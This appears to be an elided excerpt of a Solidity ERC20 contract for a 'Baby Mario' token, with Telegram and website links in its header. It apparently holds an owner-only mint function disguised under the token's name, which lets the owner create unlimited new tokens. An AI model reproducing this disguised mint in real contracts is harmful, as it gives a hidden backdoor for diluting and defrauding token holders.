...
//
//
//   📱Telegram::https://t.me/BabyMarioChannel
//   📱Website ::https://BabyMario.Tech/
/*
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function BabyMario(uint256 amount) public onlyOwner {
    _BabyMario(msg.sender, amount);
    }
    ...
    function _BabyMario(address account, uint256 amount) internal virtual {
...
contract BabyMario is ERC20 {
    ...
    constructor() public ERC20("Baby Mario", "BabyMario") {
        _BabyMario(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
